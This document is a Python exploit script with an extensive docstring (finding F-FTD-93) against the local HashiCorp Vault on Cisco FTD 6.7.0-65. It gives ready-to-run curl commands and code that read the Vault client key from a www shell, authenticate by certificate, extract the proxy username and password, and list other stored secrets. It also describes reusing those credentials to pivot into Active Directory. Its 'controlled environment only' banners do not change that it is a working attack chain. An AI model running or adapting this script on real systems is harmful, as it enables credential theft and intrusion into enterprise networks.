"""
F-FTD-93: HashiCorp Vault localhost:8200 cert-auth → proxy credential extraction
CONTROLLED ENVIRONMENT ONLY

Root cause:
  ftd-cloudagent binary strings:
    https://127.0.0.1:8200/v1/auth/cert/login
    /etc/vault/www/updateProxyCreds/vault.crt
    /etc/vault/www/updateProxyCreds/vault.key
    https://127.0.0.1:8200/v1/proxyCredentials/credentials
    "Invalid username in vault credentials"
    "Invalid password in vault credentials"

  FTD runs a local HashiCorp Vault instance on port 8200 (TLS).
  cloudagent authenticates via TLS client certificate:
    1. POST /v1/auth/cert/login with vault.crt + vault.key → Vault token
    2. GET /v1/proxyCredentials/credentials with token → username + password

  The vault client key is stored at:
    /etc/vault/www/updateProxyCreds/vault.key
  Path convention ("www" in path) suggests it is www-readable.
  If not: F-FTD-86 (sudo openssl enc -base64 -in vault.key) extracts it as root.

STORED SECRET:
  /v1/proxyCredentials/credentials → username + password
  These are the credentials FTD uses to authenticate to an outbound HTTP proxy
  (enterprise proxy authentication — typically NTLM or Basic Auth).

  In enterprise deployments, the proxy credentials are a service account in AD:
  → Credential reuse: authenticate to AD LDAP, O365, other corp services
  → Combined with LDAP pivot (F-FTD-89): double AD credential source

ALSO: Vault cert auth may grant access to OTHER secrets beyond proxyCredentials:
  Standard Vault cert auth policies can be broadly scoped.
  If the updateProxyCreds cert policy is permissive:
  → List /v1/secret/ → enumerate all secrets in Vault
  → May include: AMP cloud registration keys, Talos API tokens, encryption keys

ATTACK:
  From www shell (post F-FTD-67, F-FTD-78, or other):

  Step 1: Read Vault client certificate (may be www-readable):
    ls -la /etc/vault/www/updateProxyCreds/
    # If readable by www: direct read
    # If not: sudo /usr/bin/openssl enc -base64 -in /etc/vault/www/updateProxyCreds/vault.key

  Step 2: Authenticate to Vault:
    curl -s -k --cert /etc/vault/www/updateProxyCreds/vault.crt \
      --key /etc/vault/www/updateProxyCreds/vault.key \
      -X POST https://127.0.0.1:8200/v1/auth/cert/login
    # Response: {"auth":{"client_token":"<VAULT_TOKEN>", ...}}

  Step 3: Read proxy credentials:
    VAULT_TOKEN="<token_from_step2>"
    curl -s -k -H "X-Vault-Token: $VAULT_TOKEN" \
      https://127.0.0.1:8200/v1/proxyCredentials/credentials
    # Response: {"data":{"username":"<proxy-user>","password":"<proxy-pass>"}}

  Step 4: Enumerate all accessible secrets:
    curl -s -k -H "X-Vault-Token: $VAULT_TOKEN" \
      -X LIST https://127.0.0.1:8200/v1/secret/
    # Lists all secret paths accessible to this cert's policy

ADDITIONAL VAULT ANALYSIS:
  Vault on FTD likely uses filesystem backend (in /var/vault/ or /etc/vault/data/)
  Root access (via F-FTD-85) → read raw Vault data store → decrypt with Vault's
  unseal key (which may also be stored locally or in TPM for auto-unseal)

  Vault HTTP API additional endpoints:
    GET /v1/sys/seal-status → confirm unsealed (should be — cloudagent uses it)
    GET /v1/sys/mounts → list all secret engines
    PUT /v1/auth/cert/login → authenticate

CHAIN:
  F-FTD-78/F-FTD-67 → www shell
  → Read vault.key (direct or via F-FTD-86 openssl)
  → Vault cert auth → token
  → GET /v1/proxyCredentials/credentials → proxy username + password
  → If enterprise proxy uses AD creds: full AD authentication pivot (F-FTD-89 amplified)

  With root (F-FTD-85):
  → Read Vault filesystem backend → all stored secrets
  → OR: Generate new Vault root token via Vault CLI (requires access to Vault binary)

VERIFY (controlled environment):
  # Check if vault.key exists and is readable:
  ls -la /etc/vault/www/updateProxyCreds/ 2>&1

  # Check if Vault is running:
  curl -sk https://127.0.0.1:8200/v1/sys/seal-status 2>&1 | head -5

  # Authenticate (requires cert to be readable):
  curl -sk --cert /etc/vault/www/updateProxyCreds/vault.crt \
    --key /etc/vault/www/updateProxyCreds/vault.key \
    -X POST https://127.0.0.1:8200/v1/auth/cert/login

Affected: FTD 6.7.0-65 (ftd-cloudagent strings: Vault URL, cert path, secret path confirmed)
Severity: HIGH — Vault client key extraction → proxy credential exfiltration;
          enterprise proxy creds = AD service account pivot; Vault policy may expose
          additional AMP/Talos cloud registration keys
Auth required: www shell (vault.key may be www-readable) OR root via F-FTD-86
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import json


VAULT_BASE = "https://127.0.0.1:8200"
VAULT_CERT = "/etc/vault/www/updateProxyCreds/vault.crt"
VAULT_KEY = "/etc/vault/www/updateProxyCreds/vault.key"
VAULT_SECRET_PATH = "/v1/proxyCredentials/credentials"


def check_vault_status():
    """Check if Vault is running and unsealed. CONTROLLED ENVIRONMENT ONLY."""
    print(f"[*] F-FTD-93: Checking Vault status at {VAULT_BASE}")
    cmd = ["curl", "-sk", f"{VAULT_BASE}/v1/sys/seal-status"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        print(f"    Sealed:     {data.get('sealed')}")
        print(f"    Type:       {data.get('type')}")
        print(f"    Version:    {data.get('version')}")
        print(f"    Cluster:    {data.get('cluster_name')}")
        return not data.get('sealed', True)
    except Exception as e:
        print(f"[-] Vault not reachable: {e}")
        return False


def vault_cert_auth(cert=VAULT_CERT, key=VAULT_KEY):
    """
    Authenticate to Vault via TLS client certificate.
    Returns vault token if successful.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-93: Vault cert auth")
    print(f"    Cert: {cert}")
    print(f"    Key:  {key}")

    cmd = [
        "curl", "-sk",
        "--cert", cert,
        "--key", key,
        "-X", "POST",
        f"{VAULT_BASE}/v1/auth/cert/login"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        data = json.loads(result.stdout)

        if 'auth' in data and 'client_token' in data['auth']:
            token = data['auth']['client_token']
            print(f"[!!!] Vault token obtained: {token[:20]}...")
            print(f"    Policies:   {data['auth'].get('policies', [])}")
            print(f"    Token TTL:  {data['auth'].get('lease_duration')}s")
            return token
        elif 'errors' in data:
            print(f"[-] Vault auth failed: {data['errors']}")
        else:
            print(f"    Response: {result.stdout[:200]}")
        return None

    except json.JSONDecodeError:
        print(f"    Raw: {result.stdout[:200]}")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def read_proxy_creds(token):
    """
    Read proxy credentials from Vault.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-93: Reading proxy credentials from Vault")
    url = f"{VAULT_BASE}{VAULT_SECRET_PATH}"
    cmd = ["curl", "-sk", "-H", f"X-Vault-Token: {token}", url]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        data = json.loads(result.stdout)

        creds = data.get('data', {})
        if 'username' in creds:
            print(f"[!!!] Proxy credentials extracted from Vault:")
            print(f"    Username: {creds.get('username')}")
            print(f"    Password: {creds.get('password')}")
            return creds
        else:
            print(f"    Response: {result.stdout[:300]}")
        return None

    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def enumerate_vault_secrets(token):
    """
    Enumerate all Vault secret paths accessible to this token.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-93: Enumerating Vault secret paths")

    # List secret engine mounts
    mounts_url = f"{VAULT_BASE}/v1/sys/mounts"
    cmd = ["curl", "-sk", "-H", f"X-Vault-Token: {token}", mounts_url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    try:
        mounts = json.loads(result.stdout)
        print(f"    Secret engine mounts:")
        for mount, info in mounts.items():
            if isinstance(info, dict) and 'type' in info:
                print(f"      {mount}: {info['type']}")
    except Exception:
        pass

    # List secrets in known paths
    for path in ["/v1/secret/", "/v1/proxyCredentials/", "/v1/kv/"]:
        cmd2 = ["curl", "-sk", "-X", "LIST",
                "-H", f"X-Vault-Token: {token}",
                f"{VAULT_BASE}{path}"]
        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=10)
        try:
            data = json.loads(result2.stdout)
            keys = data.get('data', {}).get('keys', [])
            if keys:
                print(f"    {path}: {keys}")
        except Exception:
            pass


def print_attack_summary():
    print("""
F-FTD-93: HashiCorp Vault localhost:8200 Cert Auth → Proxy Credential Exfil
============================================================================

Vault URL:   https://127.0.0.1:8200 (local, TLS)
Auth method: /v1/auth/cert/login (TLS client certificate)
Secret:      /v1/proxyCredentials/credentials (username + password)
Client cert: /etc/vault/www/updateProxyCreds/vault.crt
Client key:  /etc/vault/www/updateProxyCreds/vault.key

ATTACK:
  1. Read vault.key (www-readable OR via F-FTD-86 sudo openssl)
  2. POST /v1/auth/cert/login with cert/key → Vault token
  3. GET /v1/proxyCredentials/credentials → proxy username + password
  4. List /v1/sys/mounts → discover other accessible secrets (AMP keys, etc.)

IMPACT:
  Proxy credentials = typically AD service account → full AD authentication
  AMP/Talos registration keys (if in Vault) → revoke/spoof threat intelligence
  Vault policy over-permissive → additional secret exposure
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-93: Vault localhost:8200 cert auth → proxy cred extraction")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "status":
        check_vault_status()

    elif mode == "auth":
        cert = sys.argv[2] if len(sys.argv) > 2 else VAULT_CERT
        key = sys.argv[3] if len(sys.argv) > 3 else VAULT_KEY
        token = vault_cert_auth(cert, key)
        if token and len(sys.argv) > 4 and sys.argv[4] == "creds":
            read_proxy_creds(token)

    elif mode == "creds":
        token = sys.argv[2] if len(sys.argv) > 2 else None
        if not token:
            print(f"Usage: {sys.argv[0]} creds <vault-token>")
            sys.exit(1)
        read_proxy_creds(token)

    elif mode == "enum":
        token = sys.argv[2] if len(sys.argv) > 2 else None
        if not token:
            print(f"Usage: {sys.argv[0]} enum <vault-token>")
            sys.exit(1)
        enumerate_vault_secrets(token)

    elif mode == "full":
        # Full chain: check → auth → creds → enumerate
        if check_vault_status():
            token = vault_cert_auth()
            if token:
                read_proxy_creds(token)
                print()
                enumerate_vault_secrets(token)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
